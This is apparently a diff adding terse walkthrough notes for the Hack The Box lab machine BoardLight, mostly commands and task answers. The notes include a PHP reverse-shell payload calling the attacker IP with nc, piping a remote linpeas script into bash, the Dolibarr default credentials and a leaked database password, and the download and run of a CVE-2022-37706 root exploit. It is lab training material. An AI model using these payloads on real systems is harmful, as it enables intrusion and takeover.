@@ -1,0 +1,65 @@
+--------------------------------------
+BoardLight
+https://app.hackthebox.com/machines/BoardLight
+10.10.11.11
+ping 10.10.11.11
+rustscan -a 10.10.11.11 --ulimit 5000 -b 1000 -- -p1-65535
+nmap -sV -p 22,80 10.10.11.11
+Task 1 - How many TCP ports are listening on BoardLight? -2
+Task 2 - What is the domain name used by the box? - board.htb
+/etc/hosts
+10.10.11.11 board.htb
+ping board.htb
+http://10.10.11.11/
+http://boardlight.htb/
+https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+cd /usr/share/wordlists/SecLists/
+cd: no such file or directory: /usr/share/wordlists/SecLists/
+cd /usr/share/wordlists/
+Clone the SecLists repository:
+sudo git clone https://github.com/danielmiessler/SecLists.git
+Next, we proceed to fuzz the application to identify any virtual hosts using ffuf
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949
+echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
+http://crm.board.htb/
+Dolibarr 17.0.0
+Task 3 - What is the name of the application running on a virtual host of board.htb?
+admin - admin
+https://nvd.nist.gov/vuln/detail/CVE-2023-30253
+<?PHP echo system("whoami");?>
+nc -lnvp 4455
+
+<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4455 >/tmp/f");?>
+script /dev/null -c /bin/bash
+
+$dolibarr_main_db_name='dolibarr';
+$dolibarr_main_db_prefix='llx_';
+$dolibarr_main_db_user='dolibarrowner';
+$dolibarr_main_db_pass='serverfun2$2023!!';
+
+cat /etc/passwd
+
+larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
+
+ssh larissa@board.htb
+larissa@board.htb's password:
+
+Task 4 - What version of Dolibarr is running on BoardLight? 17.0.0
+Task 5 - What is the default password for the admin user on Dolibarr? admin
+Task 6 - What is the 2024 CVE ID for an authenticated vulnerability that can lead to remote code execution in this version of Dolibarr? CVE-2023-30253
+Task 7 - What user is the Dolibarr application running as on BoardLight? www-data
+Task 8 - What is the full path of the file that contains the Dolibarr database connection information? /var/www/html/crm.board.htb/htdocs/conf/conf.php
+Task 10 - What is the name of the desktop environment installed on Boardlight? - enlightenment
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+curl http://10.10.14.15:3000/linpeas.sh|bash
+Task 11 - What version of Enlightenment is installed on BoardLight? 0.23.1
+enlightenment --version
+https://nvd.nist.gov/vuln/detail/CVE-2022-37706
+Task 12 - What is the 2022 CVE ID for a vulnerability in Enlightenment versions before 0.25.4 that allows for privilege escalation?
+wget https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh
+python3 -m http.server 2000
+wget http://10.10.14.15:2000/exploit.sh
+bash exploit.sh
+https://www.hackthebox.com/achievement/machine/303878/603
+--------------------------------------
